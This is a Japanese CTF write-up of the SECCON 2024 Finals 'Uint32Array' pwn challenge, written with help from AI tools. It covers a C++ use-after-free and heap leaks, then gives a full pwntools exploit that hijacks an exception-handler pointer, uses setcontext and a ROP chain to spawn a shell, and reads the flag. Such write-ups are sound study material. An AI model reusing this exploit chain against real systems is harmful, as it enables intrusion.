---
layout: page
title: SECCON 2024 Final
parent: CTF Writeups
nav_order: 7
---

今年も SECCON Finals に Double Lariat として出てきました。
競技修了からだいぶ経ってしまい普通に書いても今更感が強いので、「AI を使ってどこまで効率化できるか」をテーマに書いていきます。実際の競技でも AI を使って色々したので、その辺りも書いていきます。
Jeoparty の Pwn、Uint32Array の解説をします。

# Uint32Array

C++製のソースコードとバイナリが与えられます。

バイナリ

```
sh-5.2$ checksec --file=./chall
[*] '/home/iwancof/WorkSpace/CTF/competitions/SECCON_2024_final/uint32array/Uint32Array/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

ソースコード

```cpp
#include <iostream>
#include <cstdint>

class Uint32Array {
public:
  Uint32Array() : _size(0), _buffer(nullptr) {}
  Uint32Array(size_t size) : _size(size), _buffer(new uint32_t[size]()) {}
  ~Uint32Array() { delete[] _buffer; }

  void clear() {
    for (ssize_t i = 0; i < _size; i++)
      _buffer[i] = 0;
  }

  uint32_t& at(size_t index) {
    if (index >= _size)
      throw std::out_of_range("out-of-bounds access");
    return _buffer[index];
  }

private:
  size_t _size;
  uint32_t *_buffer;
};

void AskArray(Uint32Array& arr) {
  size_t size = 0;
  do {
    std::cout << "size = ";
    std::cin >> size;
  } while (size > 100);

  arr = Uint32Array(size);
  arr.clear();
}

void AskIndex(size_t& index) {
  std::cout << "index = ";
  std::cin >> index;
}

void AskValue(uint32_t& value) {
  std::cout << "value = ";
  std::cin >> value;
}

int main() {
  Uint32Array arr;
  uint32_t value;
  size_t index;
  std::cin.rdbuf()->pubsetbuf(nullptr, 0);
  std::cout.rdbuf()->pubsetbuf(nullptr, 0);

  AskArray(arr);

  std::cout << "1. set" << std::endl
            << "2. get" << std::endl;
  while (std::cin.good()) {
    int choice;
    std::cout << "> ";
    std::cin >> choice;

    if (choice == 1) {
      AskIndex(index);
      AskValue(value);
      try {
        arr.at(index) = value;
      } catch(const std::out_of_range& e) {
        std::cout << "[ERR] " << e.what() << std::endl
                  << "[ERR] Would you like to enter recovery mode? [y=1/N=0]: ";
        std::cin >> choice;
        if (choice == 1) {
          std::cout << "[ERR] Entering recovery mode: Try again." << std::endl;
          AskIndex(index);
          AskValue(value);
          arr.at(index) = value;
        }
      }

    } else if (choice == 2) {
      AskIndex(index);
      std::cout << "arr[" << index << "] = " << arr.at(index) << std::endl;

    } else {
      std::cout << "Bye!" << std::endl;
      break;
    }
  }

  return 0;
}
```

まず、o1 pro に脆弱性の発見を行ってもらいます。

```
arr = Uint32Array(size); の代入時、デフォルトのコピー代入演算子が「ポインタのシャローコピー」を行うため、
一時オブジェクトの破棄後に arr が解放済みメモリを指す状態になる。
これにより Use-After-Free（および二重解放）の脆弱性が生じる。
```

ホーン。確かに。しかも size がある程度自由に設定できるので、任意のオブジェクトを重ねることができそうです。

次に、Claude 3.7 Sonnet(thinking) に設定された Roo Code にヘルパーを書いてもらいます。

```python
def set_value(sock, index, value):
    """
    指定されたインデックスに値を設定するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 設定するインデックス
        value: 設定する値

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # 1: set を選択
        sock.sendlineafter(b"> ", b"1")
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を入力
        sock.sendlineafter(b"value = ", str(value).encode())
        return True
    except Exception as e:
        print(f"[!] set_value failed: {e}")
        return False

def get_value(sock, index):
    """
    指定されたインデックスの値を取得するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 取得するインデックス

    Returns:
        成功した場合は値、失敗した場合はNone
    """
    try:
        # 2: get を選択
        sock.sendlineafter(b"> ", b"2")
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を取得
        sock.recvuntil(b"arr[" + str(index).encode() + b"] = ")
        value = int(sock.recvline().strip())
        return value
    except Exception as e:
        print(f"[!] get_value failed: {e}")
        return None

def set_value_recovery(sock, index, value):
    """
    リカバリーモードで値を設定するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 設定するインデックス
        value: 設定する値

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を入力
        sock.sendlineafter(b"value = ", str(value).encode())
        return True
    except Exception as e:
        print(f"[!] set_value_recovery failed: {e}")
        return False

def trigger_recovery_mode(sock, enter = True, out_of_bounds_index=100, value=0x41414141):
    """
    リカバリーモードをトリガーするヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        out_of_bounds_index: 範囲外のインデックス（デフォルト: 100）
        value: 設定する値（デフォルト: 0x41414141）

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # 1: set を選択
        sock.sendlineafter(b"> ", b"1")
        # 範囲外のインデックスを入力
        sock.sendlineafter(b"index = ", str(out_of_bounds_index).encode())
        # 値を入力
        sock.sendlineafter(b"value = ", str(value).encode())
        # リカバリーモードに入る

        if enter:
            sock.sendlineafter(b"[y=1/N=0]: ", b"1")
        else:
            sock.sendlineafter(b"[y=1/N=0]: ", b"0")
        return True
    except Exception as e:
        print(f"[!] trigger_recovery_mode failed: {e}")
        return False

```

double free が発生したあと、実際にどんなサイズの malloc が走るのか見ていきます。サイズによっては、arr を重ねて変な操作ができるかもしれません。

```python
p = gdb.debug("./main_patch", gdbscript="""
tb AskArray
c
fin
b malloc
c
""")

p.sendlineafter(b'size = ', b'10')

p.interactive()
```

適当なガチャガチャをしていると、例外発生時に malloc が走ります。ヒープの状態を見ると次のようになっていました。

```
(...)

Allocated chunk | PREV_INUSE
Addr: 0x651e9ce4f6b0
Size: 0x1010 (with flag bits: 0x1011)

Allocated chunk | PREV_INUSE
Addr: 0x651e9ce506c0
Size: 0xa0 (with flag bits: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x651e9ce50760
Size: 0x40 (with flag bits: 0x41)

Top chunk | PREV_INUSE
Addr: 0x651e9ce507a0
Size: 0xd860 (with flag bits: 0xd861)

pwndbg> tel 0x651e9ce506c0
00:0000│    0x651e9ce506c0 ◂— 0
01:0008│    0x651e9ce506c8 ◂— 0xa1
02:0010│    0x651e9ce506d0 ◂— 1
03:0018│    0x651e9ce506d8 ◂— 0
04:0020│ r8 0x651e9ce506e0 —▸ 0x651e9a807cc8 (typeinfo for std::out_of_range@GLIBCXX_3.4) —▸ 0x781df3948be8 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x781df3796000 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64
05:0028│    0x651e9ce506e8 —▸ 0x781df37ac100 (std::out_of_range::~out_of_range()) ◂— endbr64
06:0030│    0x651e9ce506f0 —▸ 0x781df377fa40 (std::terminate()) ◂— endbr64
07:0038│    0x651e9ce506f8 —▸ 0x781df3797360 (__gnu_cxx::__verbose_terminate_handler()) ◂— endbr64
pwndbg> tel 0x651e9ce50760
00:0000│  0x651e9ce50760 ◂— 0
01:0008│  0x651e9ce50768 ◂— 0x41 /* 'A' */
02:0010│  0x651e9ce50770 ◂— 0x14
03:0018│  0x651e9ce50778 ◂— 0x14
04:0020│  0x651e9ce50780 ◂— 0
05:0028│  0x651e9ce50788 ◂— 0x622d666f2d74756f ('out-of-b')
06:0030│  0x651e9ce50790 ◂— 'ounds access'
07:0038│  0x651e9ce50798 ◂— 0x73736563 /* 'cess' */

```

サイズ 0x40 は`std::string`か`std::out_of_range`っぽいですね。"out-of-bounds access"という文字列が入っています。
サイズ 0xA0 は何かわかりませんが、関数ポインタが沢山乗っています。

とりあえず、0xA0 の方に`arr`を重ねてみましょう。36 個の要素を持つ Uint32Array を作成するとちょうど 0xA0 サイズのチャンクが作られます。
最初の処理でそれが開放され、例外発生時に 0xA0 が再度確保され、そこに各種例外用の値がセットされることになります。

つまり、

1. 36 個の要素を持つ Uint32Array を作成
2. 例外を発生させる
3. get_value でバッファの内容をリーク

これで、ヒープの状態を見ることができます。

AI に`get_valueの値を64bitにして配列に入れて〜`と頼むとよしなにコード生成してくれます。

```python
# Collect freed values
values = []
combined_values = []

# Collect 32-bit values
for i in range(36):
    val = get_value(p, i)
    if val is not None:
        values.append(val)
        print(f"Index {i}: {val} (0x{val:08x})")

# Combine adjacent 32-bit values into 64-bit values
for i in range(0, len(values), 2):
    if i + 1 < len(values):
        combined = (values[i+1] << 32) | values[i]  # Little endian
        combined_values.append(combined)
        print(f"Combined {i}/{i+1}: 0x{combined:016x}")

# Display all combined 64-bit values
print("\nAll 64-bit values:")
for i, val in enumerate(combined_values):
    print(f"[{i}] 0x{val:016x}"
```

🆗

結果はこんな感じ。

```
[0] 0x0000000000000000
[1] 0xb514a01324e5b831
[2] 0x00005a44d3edccc8
[3] 0x000077047f93b100
[4] 0x000077047f90ea40
[5] 0x000077047f926360
[6] 0x0000000000000000
[7] 0x0000000100000001
[8] 0x00005a44d3edb34c
[9] 0x00005a44d3edb31c
[10] 0x00005a44d3eda3b4
[11] 0x00005a44fe971750
[12] 0x474e5543432b2b00
[13] 0x000077047f924290
[14] 0x0000000000000000
[15] 0x00007fff673a5500
[16] 0x000077047fad7f28
[17] 0x00005a44fe971788
```

その時のヒープの状態はこんな感じ。

```
pwndbg> tel 0x5a44fe9716c0 20
00:0000│  0x5a44fe9716c0 ◂— 0
01:0008│  0x5a44fe9716c8 ◂— 0xa1
02:0010│  0x5a44fe9716d0 ◂— 0
03:0018│  0x5a44fe9716d8 ◂— 0xb514a01324e5b831
04:0020│  0x5a44fe9716e0 —▸ 0x5a44d3edccc8 (typeinfo for std::out_of_range@GLIBCXX_3.4) —▸ 0x77047fad7be8 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x77047f925000 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64
05:0028│  0x5a44fe9716e8 —▸ 0x77047f93b100 (std::out_of_range::~out_of_range()) ◂— endbr64
06:0030│  0x5a44fe9716f0 —▸ 0x77047f90ea40 (std::terminate()) ◂— endbr64
07:0038│  0x5a44fe9716f8 —▸ 0x77047f926360 (__gnu_cxx::__verbose_terminate_handler()) ◂— endbr64
08:0040│  0x5a44fe971700 ◂— 0
09:0048│  0x5a44fe971708 ◂— 0x100000001
0a:0050│  0x5a44fe971710 —▸ 0x5a44d3edb34c ◂— 0x1cc000007d01
0b:0058│  0x5a44fe971718 —▸ 0x5a44d3edb31c ◂— 0xda05192901359bff
0c:0060│  0x5a44fe971720 —▸ 0x5a44d3eda3b4 (main[cold]+116) ◂— endbr64
0d:0068│  0x5a44fe971728 —▸ 0x5a44fe971750 —▸ 0x77047fad7f28 (vtable for std::logic_error+16) —▸ 0x77047f93af40 (std::logic_error::~logic_error()) ◂— endbr64
0e:0070│  0x5a44fe971730 ◂— 0x474e5543432b2b00
0f:0078│  0x5a44fe971738 —▸ 0x77047f924290 (__gxx_exception_cleanup(_Unwind_Reason_Code, _Unwind_Exception*)) ◂— endbr64
10:0080│  0x5a44fe971740 ◂— 0
11:0088│  0x5a44fe971748 —▸ 0x7fff673a5500 —▸ 0x5a44fe9716d0 ◂— 0
12:0090│  0x5a44fe971750 —▸ 0x77047fad7f28 (vtable for std::logic_error+16) —▸ 0x77047f93af40 (std::logic_error::~logic_error()) ◂— endbr64
13:0098│  0x5a44fe971758 —▸ 0x5a44fe971788 ◂— 'out-of-bounds access'
```

これにより、libstdc++や libc、ヒープなどの値をリークすることができました（libstdc++と libc の配置は隣接することに注意）。オフセット等を適当に計算し、ベースアドレスも手に入れることができます。
さて、exploit パートです。

利用するのはここ

```cpp
std::cout << "[ERR] " << e.what() << std::endl
            << "[ERR] Would you like to enter recovery mode? [y=1/N=0]: ";
std::cin >> choice;
if (choice == 1) {
    std::cout << "[ERR] Entering recovery mode: Try again." << std::endl;
    AskIndex(index);
    AskValue(value);
    arr.at(index) = value;
}
```

リカバリーモードに入ると、一度だけ`arr`に値を書き込むことができます。関数ポインタが沢山あるので、色々書き換えることでクラッシュさせてその時の様子を観察しましょう。
AI に頼みます。

```python
def inner(write_idx):
    # 再度リカバリーモードをトリガーして値を書き込む
    trigger_recovery_mode(p, enter=True)
    set_value_recovery(p, write_idx, 0xdeadbeef)

    p.sendline(b"3")

    print("write_idx: ", write_idx)
    p.interactive()

# 0から36までの偶数値でテスト
for idx in range(0, 36, 2):
    inner(idx)
```

やりたいことを察し、全体をラップしてくれました。偉いですね。

実行すると、オフセット`6`と`26`に値を書き込むと、それがちょうど関数ポインタになっているようです。RIP の下位 32bit が 0xdeadbeef になり SEGFAULT で落ちます。RIP が取れたのでこれを使ってシェルを取得していきます。

単純な one_gadget は全て試してみましたが、条件の合うものはなく、地道に進めていくことにします。

6 のときのレジスタはこんな感じ。

```
pwndbg> regs
 RAX  0x7512deadbeef
 RBX  0x604f5f084750 —▸ 0x7512f9c66fc8 (vtable for std::out_of_range+16) —▸ 0x7512f9aca100 (std::out_of_range::~out_of_range()) ◂— endbr64
 RCX  0x604f5f0846d0 ◂— 0
 RDX  0
 RDI  0x604f5f084750 —▸ 0x7512f9c66fc8 (vtable for std::out_of_range+16) —▸ 0x7512f9aca100 (std::out_of_range::~out_of_range()) ◂— endbr64
 RSI  0x604f5f084730 ◂— 0x474e5543432b2b00
 R8   0x7512f9c71e00 (__gnu_internal::buf_cin_sync) —▸ 0x7512f9c6aa08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7512f9b200c0 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64
 R9   0xffffffff
 R10  0
 R11  0xa
 R12  0x604f20be7040 (std::cout@GLIBCXX_3.4) —▸ 0x7512f9c6c310 (vtable for std::basic_ostream<char, std::char_traits<char> >+24) —▸ 0x7512f9b4d670 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64
 R13  0x7ffc28246268 ◂— 6
 R14  0x604f20be502c ◂— 0x6f2d74756f00203e /* '> ' */
 R15  0x604f20be500c ◂— 'index = '
 RBP  0x7ffc28246220 —▸ 0x7ffc28246264 ◂— 0x600000001
 RSP  0x7ffc28246208 —▸ 0x7512f9ab32bb (__gxx_exception_cleanup(_Unwind_Reason_Code, _Unwind_Exception*)+43) ◂— mov rdi, rbx
 RIP  0x7512deadbeef
```

26 だとこう

```
pwndbg> regs
 RAX  0x7d39deadbeef
 RBX  0x5e0c85acb160 (std::cin@GLIBCXX_3.4) —▸ 0x7d391c176870 (vtable for std::basic_istream<char, std::char_traits<char> >+24) —▸ 0x7d391c039690 (std::basic_istream<char, std::char_traits<char> >::~basic_istream()) ◂— endbr64
 RCX  0x5e0c98aa56d0 ◂— 1
 RDX  0
 RDI  1
 RSI  0x5e0c98aa5730 ◂— 0x474e5543432b2b00
 R8   0x7d391c17ce00 (__gnu_internal::buf_cin_sync) —▸ 0x7d391c175a08 (vtable for __gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >+16) —▸ 0x7d391c02b0c0 (__gnu_cxx::stdio_sync_filebuf<char, std::char_traits<char> >::~stdio_sync_filebuf()) ◂— endbr64
 R9   0xffffffff
 R10  0
 R11  0xa
 R12  0x5e0c85acb040 (std::cout@GLIBCXX_3.4) —▸ 0x7d391c177310 (vtable for std::basic_ostream<char, std::char_traits<char> >+24) —▸ 0x7d391c058670 (std::basic_ostream<char, std::char_traits<char> >::~basic_ostream()) ◂— endbr64
 R13  0x7ffdd43fe958 ◂— 0x1a
 R14  0x5e0c85ac902c ◂— 0x6f2d74756f00203e /* '> ' */
 R15  0x5e0c85ac900c ◂— 'index = '
 RBP  0x7ffdd43fe954 ◂— 0x1a00000001
 RSP  0x7ffdd43fe918 —▸ 0x5e0c85ac84f8 (main[cold]+440) ◂— jmp main+179
 RIP  0x7d39deadbeef
```

6 だと RDI がヒープに向いているので、gets など第一引数にバッファを取る系の関数だと非常に相性が良さそうです。
ただし、cin による値の読み込みは scanf("%d")などと同様、数値を読み込んだ際に改行文字のクリアなどを行わないため、直後に gets を使う場合改行コードで終了してしまうことがあります。
値の送信時、改行コードを手動で送るようにして対策します。

```python
# set_value_recovery
sock.sendafter(b"value = ", str(value).encode())
```

`0xdeadbeef`を送りつけてみます。

```python
# 再度リカバリーモードをトリガーして値を書き込む
trigger_recovery_mode(p, enter=True)
set_value_recovery(p, write_idx, libc.symbols['gets'] & 0xffffffff)
p.sendline(pack(0xdeadbeef) * 10)

p.interactive()
```

```
pwndbg> tel 0x5f380722c6c0 40
00:0000│     0x5f380722c6c0 ◂— 0
01:0008│     0x5f380722c6c8 ◂— 0xa1
02:0010│ r10 0x5f380722c6d0 ◂— 0
03:0018│     0x5f380722c6d8 ◂— 0x3c5f77c2afe93439
04:0020│     0x5f380722c6e0 —▸ 0x5f37d47d2cc8 (typeinfo for std::out_of_range@GLIBCXX_3.4) —▸ 0x726aa0fb7be8 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x726aa0e05000 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64

# 関数ポインタがgetsに書き換わっている
05:0028│     0x5f380722c6e8 —▸ 0x726aa0b81070 (gets) ◂— endbr64

06:0030│     0x5f380722c6f0 —▸ 0x726aa0deea40 (std::terminate()) ◂— endbr64
07:0038│     0x5f380722c6f8 —▸ 0x726aa0e06360 (__gnu_cxx::__verbose_terminate_handler()) ◂— endbr64
08:0040│     0x5f380722c700 ◂— 0
09:0048│     0x5f380722c708 ◂— 0x100000001
0a:0050│     0x5f380722c710 —▸ 0x5f37d47d134c ◂— 0x1cc000007d01
0b:0058│     0x5f380722c718 —▸ 0x5f37d47d131c ◂— 0xda05192901359bff
0c:0060│     0x5f380722c720 —▸ 0x5f37d47d03b4 (main[cold]+116) ◂— endbr64
0d:0068│     0x5f380722c728 —▸ 0x5f380722c750 ◂— 0xdeadbeef
0e:0070│     0x5f380722c730 ◂— 0x474e5543432b2b00
0f:0078│     0x5f380722c738 —▸ 0x726aa0e04290 (__gxx_exception_cleanup(_Unwind_Reason_Code, _Unwind_Exception*)) ◂— endbr64
10:0080│     0x5f380722c740 ◂— 0
11:0088│     0x5f380722c748 —▸ 0x7ffce58c41e0 —▸ 0x5f380722c6d0 ◂— 0

# ここから書き込みが行われる
12:0090│     0x5f380722c750 ◂— 0xdeadbeef
... ↓        9 skipped
1c:00e0│     0x5f380722c7a0 ◂— 0
1d:00e8│     0x5f380722c7a8 ◂— 0xd861
1e:00f0│     0x5f380722c7b0 ◂— 0
... ↓        9 skipped
```

ここまでの状況をまとめると、自由に書き込みを行うことができるバッファと、それを第一引数に取る関数を自由に設定できるという状況です。
しかし、書き込み先バッファは`std::out_of_range`構造体で上書きされてしまうため、単純に`system("/bin/sh")`を呼び出すことはできません。

ここで、バッファに`ucontext_t`、関数ポインタに`setcontext`を設定することでシェルを取得することを考えます。
ただ、実際に試してみると rdi レジスタに相当する値が、色々な処理で`0`で上書きされてしまうため、`rip=system && rdi="/bin/sh"`という形でシェルを取得することはできません。
実験の結果、rsp は自由に設定することができるので、これをヒープに向けておき最後に ROP をすることでシェルを取得し、問題を解くことができました。

最終的な exploit は以下のようになります。

```python
#!/usr/bin/env python3

from pwn import *
import time

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

libc = ELF("./libs/libc.so.6")

def exploit():
    # def inner(arg, use_gdb=False):
    def inner(use_gdb=False):
        if use_gdb:
            p = gdb.debug("./main_patch", gdbscript="""
            set print elements 15
""")
        else:
            p = remote("uint32array.dom.seccon.games", 9999)

        # 例外処理で使われるmallocのサイズ
        p.sendlineafter(b'size = ', b'36') # 36 * 4

        p.interactive()

        trigger_recovery_mode(p, enter=False)

        memory = []
        for i in range(18):
            low = get_value(p, 2*i)
            high = get_value(p, 2*i + 1)
            if low is not None and high is not None:
                val64 = (high << 32) | low
                # print(f"[{2*i}:{2*i+1}] = {hex(val64)}")
                memory.append(val64)

        binary_base = memory[2] - 0x3cc8 # typeinfo for std::out_of_range@GLIBCXX_3.4
        libstdcpp_base = memory[3] - 0xd2100 # out of range
        some_heap_addr = memory[11] - 0x12b50
        stack = memory[15]
        libc_base = libstdcpp_base - 0x240000

        info(f"binary_base: {hex(binary_base)}")
        info(f"libstdcpp_base: {hex(libstdcpp_base)}")
        info(f"heap one: {hex(some_heap_addr)}")
        info(f"stack: {hex(stack)}")
        info(f"libc_base: {hex(libc_base)}")

        assert libc_base & 0xfff == 0；

        libc.address = libc_base

        gets = libc.symbols['gets']
        system = libc.symbols['system']
        setcontext = libc.symbols['setcontext']

        # rop gadgets
        ret = libc_base + 0x000000000002882f
        pop_rdi = libc_base + 0x000000000010f75b
        bin_sh = next(libc.search(b"/bin/sh\x00"))

        trigger_recovery_mode(p, enter=True)
        set_value_recovery(p, 6, gets & 0xffffffff) # overwrite function pointer
        # set_value_recovery(p, 6, 0xdeadbeef)

        rop_start_offset = 0x100
        payload = create_ucontext(src=some_heap_addr + 0x12b50, rsp=some_heap_addr + 0x12b50 + rop_start_offset, rip=ret)

        padding_for_heap = pack(1) * 11 + pack(0xe461) # top size
        print(f'length of padding is {hex(len(padding_for_heap))}')

        payload[0: len(padding_for_heap)] = padding_for_heap

        rop = b""
        rop += pack(pop_rdi)
        rop += pack(bin_sh)
        rop += pack(system)

        payload[rop_start_offset: ] = rop

        p.sendline(payload)

        trigger_recovery_mode(p, enter=True)
        set_value_recovery(p, 6, setcontext & 0xffffffff) # overwrite function pointer

        p.sendline(b"")

        sleep(1)

        p.sendline(b"ls /")
        p.sendline(b"echo \"[!!!] You got real world\"")

        p.sendline(b"cat /flag*")

        p.interactive()

    inner(use_gdb=True)

def create_ucontext(
    src: int,
    rsp=2,
    rbx=2,
    rbp=2,
    r12=2,
    r13=2,
    r14=2,
    r15=2,
    rsi=2,
    rdi=2,
    rcx=2,
    r8=2,
    r9=2,
    rdx=2,
    rip=0xDEADBEEF,
) -> bytearray:
    b = bytearray(0x200)
    b[0xE0:0xE8] = p64(src)  # fldenv ptr
    b[0x1C0:0x1C8] = p64(0x1F80)  # ldmxcsr

    b[0xA0:0xA8] = p64(rsp)
    b[0x80:0x88] = p64(rbx)
    b[0x78:0x80] = p64(rbp)
    b[0x48:0x50] = p64(r12)
    b[0x50:0x58] = p64(r13)
    b[0x58:0x60] = p64(r14)
    b[0x60:0x68] = p64(r15)

    b[0xA8:0xB0] = p64(rip)  # ret ptr
    b[0x70:0x78] = p64(rsi)
    b[0x68:0x70] = p64(rdi)
    b[0x98:0xA0] = p64(rcx)
    b[0x28:0x30] = p64(r8)
    b[0x30:0x38] = p64(r9)
    b[0x88:0x90] = p64(rdx)

    return b

def set_value(sock, index, value):
    """
    指定されたインデックスに値を設定するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 設定するインデックス
        value: 設定する値

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # 1: set を選択
        sock.sendlineafter(b"> ", b"1")
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を入力
        sock.sendlineafter(b"value = ", str(value).encode())
        return True
    except Exception as e:
        print(f"[!] set_value failed: {e}")
        return False

def get_value(sock, index):
    """
    指定されたインデックスの値を取得するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 取得するインデックス

    Returns:
        成功した場合は値、失敗した場合はNone
    """
    try:
        # 2: get を選択
        sock.sendlineafter(b"> ", b"2")
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を取得
        sock.recvuntil(b"arr[" + str(index).encode() + b"] = ")
        value = int(sock.recvline().strip())
        return value
    except Exception as e:
        print(f"[!] get_value failed: {e}")
        return None

def set_value_recovery(sock, index, value):
    """
    リカバリーモードで値を設定するヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        index: 設定するインデックス
        value: 設定する値

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # インデックスを入力
        sock.sendlineafter(b"index = ", str(index).encode())
        # 値を入力
        sock.sendafter(b"value = ", str(value).encode())
        return True
    except Exception as e:
        print(f"[!] set_value_recovery failed: {e}")
        return False

def trigger_recovery_mode(sock, enter = True, out_of_bounds_index=100, value=0x41414141):
    """
    リカバリーモードをトリガーするヘルパー関数

    Args:
        sock: ソケット（pwntools processオブジェクト）
        out_of_bounds_index: 範囲外のインデックス（デフォルト: 100）
        value: 設定する値（デフォルト: 0x41414141）

    Returns:
        成功した場合はTrue、失敗した場合はFalse
    """
    try:
        # 1: set を選択
        sock.sendlineafter(b"> ", b"1")
        # 範囲外のインデックスを入力
        sock.sendlineafter(b"index = ", str(out_of_bounds_index).encode())
        # 値を入力
        sock.sendlineafter(b"value = ", str(value).encode())
        # リカバリーモードに入る

        if enter:
            sock.sendlineafter(b"[y=1/N=0]: ", b"1")
        else:
            sock.sendlineafter(b"[y=1/N=0]: ", b"0")
        return True
    except Exception as e:
        print(f"[!] trigger_recovery_mode failed: {e}")
        return False

def main():
    exploit()

if __name__ == "__main__":
    main()

```

# 感想

脆弱性の発見やヘルパー関数の定義、面倒な雑用などは全部 AI がやってくれており、人間である私は exploit の本質部分に集中することができました。
正直かなり便利であり、この件で AI x Pwn に可能性を見出したため個人的な研究をしています。手伝ってくれる方、ご連絡お待ちしております。

それと、なんか Rev は AI で一発だったらしいです。終わったあとの食事会で、「どの分野が最初に AI に駆逐されるか」みたいな話をしていましたが、やっぱり Rev か Crypto なんですかね。門外漢なのでわかりませんが。
Pwn は本質パートを解くための試行錯誤があり、そのために GDB の操作を必要ですが、Cline や Roo Code のなどの Computer Use は REPL をうまく使ってくれないのでちょっと厳しそうですね。

# 余談

First Blood 取ってやるぞと思って二日目の競技開始 30 秒前からペイロードを飛ばしまくっていた所、数秒差で TSG のいわしさんに勝つことができました。やったぜ。
